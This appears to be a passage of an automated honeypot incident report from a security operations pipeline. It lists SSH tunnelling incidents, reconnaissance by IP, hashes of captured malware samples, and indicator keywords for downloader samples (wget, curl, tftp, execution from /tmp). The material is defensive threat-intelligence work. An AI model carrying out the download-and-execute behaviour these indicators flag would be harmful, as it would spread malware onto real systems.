| **First Seen** | 2026-08-05 16:40 |
| **Last Seen** | 2026-08-05 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:40:42` | `cowrie.session.connect` |
| `2026-08-05 16:40:42` | `cowrie.client.version` |
| `2026-08-05 16:40:42` | `cowrie.client.kex` |
| `2026-08-05 16:40:43` | `cowrie.login.success` |
| `2026-08-05 16:40:43` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:40:43` | `cowrie.direct-tcpip.data` |
| `2026-08-05 16:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.181[.]21` to AbuseIPDB if not already reported
- [ ] Block `130.12.181[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-674b44f115c0

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]225` |
| **First Seen** | 2026-08-05 16:44 |
| **Last Seen** | 2026-08-05 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:44:42` | `cowrie.session.connect` |
| `2026-08-05 16:44:42` | `cowrie.client.version` |
| `2026-08-05 16:44:42` | `cowrie.client.kex` |
| `2026-08-05 16:44:43` | `cowrie.login.success` |
| `2026-08-05 16:44:43` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:44:43` | `cowrie.direct-tcpip.data` |
| `2026-08-05 16:44:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]225` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d56f7ec1e15

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]230` |
| **First Seen** | 2026-08-05 16:49 |
| **Last Seen** | 2026-08-05 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:49:52` | `cowrie.session.connect` |
| `2026-08-05 16:49:52` | `cowrie.client.version` |
| `2026-08-05 16:49:52` | `cowrie.client.kex` |
| `2026-08-05 16:49:52` | `cowrie.login.success` |
| `2026-08-05 16:49:53` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:49:53` | `cowrie.direct-tcpip.data` |
| `2026-08-05 16:49:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]230` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f419bbab849c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-05 16:52 |
| **Last Seen** | 2026-08-05 16:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:52:07` | `cowrie.session.connect` |
| `2026-08-05 16:52:07` | `cowrie.client.version` |
| `2026-08-05 16:52:07` | `cowrie.client.kex` |
| `2026-08-05 16:52:07` | `cowrie.login.success` |
| `2026-08-05 16:52:07` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:52:07` | `cowrie.direct-tcpip.data` |
| `2026-08-05 16:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fab9910a3cb

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-05 16:52 |
| **Last Seen** | 2026-08-05 16:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:52:27` | `cowrie.session.connect` |
| `2026-08-05 16:52:27` | `cowrie.client.version` |
| `2026-08-05 16:52:27` | `cowrie.client.kex` |
| `2026-08-05 16:52:27` | `cowrie.login.success` |
| `2026-08-05 16:52:27` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:52:27` | `cowrie.direct-tcpip.data` |
| `2026-08-05 16:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-716637956ea1

| Field | Detail |
|---|---|
| **Source IP** | `207.254.71[.]129` |
| **First Seen** | 2026-08-05 16:54 |
| **Last Seen** | 2026-08-05 16:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 16:54:23` | `cowrie.session.connect` |
| `2026-08-05 16:54:24` | `cowrie.client.version` |
| `2026-08-05 16:54:24` | `cowrie.client.kex` |
| `2026-08-05 16:54:25` | `cowrie.login.success` |
| `2026-08-05 16:54:25` | `cowrie.direct-tcpip.request` |
| `2026-08-05 16:54:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.254.71[.]129` to AbuseIPDB if not already reported
- [ ] Block `207.254.71[.]129` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.138[.]58` | **134** | 2026-08-05 12:59 | 2026-08-05 16:49 | 73m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-08-05 13:06 | 2026-08-05 16:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **6** | 2026-08-05 15:01 | 2026-08-05 16:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.220.160[.]67` | **4** | 2026-08-05 15:07 | 2026-08-05 15:07 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `64.89.162[.]146` | **4** | 2026-08-05 13:45 | 2026-08-05 13:45 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `130.12.182[.]224` | **3** | 2026-08-05 14:07 | 2026-08-05 14:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]222` | **3** | 2026-08-05 14:38 | 2026-08-05 14:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]123` | **3** | 2026-08-05 13:45 | 2026-08-05 13:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]163` | **3** | 2026-08-05 16:24 | 2026-08-05 16:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-08-05 15:31 | 2026-08-05 15:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **3** | 2026-08-05 14:11 | 2026-08-05 14:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **3** | 2026-08-05 13:01 | 2026-08-05 15:00 | 4m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]83` | **3** | 2026-08-05 12:55 | 2026-08-05 12:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **3** | 2026-08-05 14:58 | 2026-08-05 16:10 | 2m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]198` | **2** | 2026-08-05 14:25 | 2026-08-05 14:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.150.194[.]114` | **2** | 2026-08-05 16:06 | 2026-08-05 16:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | **2** | 2026-08-05 14:37 | 2026-08-05 15:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]201` | **2** | 2026-08-05 12:57 | 2026-08-05 12:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]210` | **2** | 2026-08-05 14:10 | 2026-08-05 14:10 | 0m | 1 | `T1110.001` | 🟢 LOW |
| `100.35.232[.]6` | 1 | 2026-08-05 16:45 | 2026-08-05 16:45 | 13s | 0 | `T1592` | 🟢 LOW |
| `106.246.89[.]68` | 1 | 2026-08-05 16:03 | 2026-08-05 16:03 | 2s | 0 | `T1592` | 🟢 LOW |
| `110.78.165[.]192` | 1 | 2026-08-05 13:29 | 2026-08-05 13:29 | 13s | 0 | `T1592` | 🟢 LOW |
| `112.30.127[.]9` | 1 | 2026-08-05 15:09 | 2026-08-05 15:09 | 8s | 0 | `T1592` | 🟢 LOW |
| `117.204.1[.]45` | 1 | 2026-08-05 15:48 | 2026-08-05 15:48 | 2s | 0 | `T1592` | 🟢 LOW |
| `120.48.44[.]93` | 1 | 2026-08-05 13:31 | 2026-08-05 13:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.124.183[.]254` | 1 | 2026-08-05 14:36 | 2026-08-05 14:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `144.124.192[.]218` | 1 | 2026-08-05 16:29 | 2026-08-05 16:29 | 14s | 0 | `T1592` | 🟢 LOW |
| `172.104.210[.]105` | 1 | 2026-08-05 13:37 | 2026-08-05 13:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `174.75.211[.]196` | 1 | 2026-08-05 14:57 | 2026-08-05 14:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.104.184[.]86` | 1 | 2026-08-05 13:40 | 2026-08-05 13:41 | 14s | 0 | `T1592` | 🟢 LOW |
| `178.128.80[.]167` | 1 | 2026-08-05 13:40 | 2026-08-05 13:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.161.211[.]69` | 1 | 2026-08-05 13:12 | 2026-08-05 13:12 | 14s | 0 | `T1592` | 🟢 LOW |
| `193.242.162[.]244` | 1 | 2026-08-05 16:09 | 2026-08-05 16:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.21[.]165` | 1 | 2026-08-05 13:33 | 2026-08-05 13:33 | 12s | 0 | `T1592` | 🟢 LOW |
| `195.28.188[.]8` | 1 | 2026-08-05 13:55 | 2026-08-05 13:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `195.78.100[.]228` | 1 | 2026-08-05 13:04 | 2026-08-05 13:04 | 11s | 0 | `T1592` | 🟢 LOW |
| `200.187.162[.]98` | 1 | 2026-08-05 15:16 | 2026-08-05 15:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `221.159.21[.]170` | 1 | 2026-08-05 15:48 | 2026-08-05 15:48 | 11s | 0 | `T1592` | 🟢 LOW |
| `31.202.95[.]23` | 1 | 2026-08-05 15:29 | 2026-08-05 15:29 | 11s | 0 | `T1592` | 🟢 LOW |
| `45.126.120[.]53` | 1 | 2026-08-05 15:13 | 2026-08-05 15:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-08-05 13:06 | 2026-08-05 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-08-05 16:05 | 2026-08-05 16:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.205.1[.]247` | 1 | 2026-08-05 15:37 | 2026-08-05 15:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-08-05 14:37 | 2026-08-05 14:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.255.181[.]141` | 1 | 2026-08-05 16:49 | 2026-08-05 16:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.126.84[.]36` | 1 | 2026-08-05 15:49 | 2026-08-05 15:49 | 17s | 0 | `T1592` | 🟢 LOW |
| `60.188.249[.]64` | 1 | 2026-08-05 15:43 | 2026-08-05 15:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]192` | 1 | 2026-08-05 13:06 | 2026-08-05 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]143` | 1 | 2026-08-05 12:55 | 2026-08-05 12:55 | 11s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]65` | 1 | 2026-08-05 15:04 | 2026-08-05 15:04 | 16s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]42` | 1 | 2026-08-05 15:30 | 2026-08-05 15:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `81.43.21[.]188` | 1 | 2026-08-05 15:24 | 2026-08-05 15:25 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.221.6[.]221` | 1 | 2026-08-05 13:18 | 2026-08-05 13:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.225.162[.]220` | 1 | 2026-08-05 15:48 | 2026-08-05 15:49 | 11s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]36` | 1 | 2026-08-05 16:39 | 2026-08-05 16:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.180.129[.]35` | 1 | 2026-08-05 13:04 | 2026-08-05 13:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `94.26.106[.]234` | 1 | 2026-08-05 13:04 | 2026-08-05 13:04 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.46.143[.]34` | 1 | 2026-08-05 13:38 | 2026-08-05 13:38 | 11s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **33/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 44/100 | 🟡 MEDIUM | **34/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 62/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `159.65.138[.]39` | SG | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 5 |
| `193.32.21[.]165` | UA | LLC MicroTeam | **100** ⚠️ | 1 |
| `60.172.54[.]36` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `38.148.20[.]90` | US | Sumofiber | **100** ⚠️ | 2 |
| `130.12.182[.]223` | DE | Netiface LLC | **100** ⚠️ | 13 |
| `20.150.194[.]114` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `13.140.178[.]221` | FR | Contabo GmbH | **100** ⚠️ | 0 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `91.221.6[.]221` | UA | Antipov Oleg | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 216 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 180 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 58 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 55 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 55 |

---

## 🔕 False Positive Summary (55 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 4 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 4 |
| AbuseIPDB score 3 below threshold 25 | 4 |
| AbuseIPDB score 6 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 35 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 468 cases |
| Tool 34  | Credential Extractor        | ✅ 207 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 19 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 155 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 55 filtered (11.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
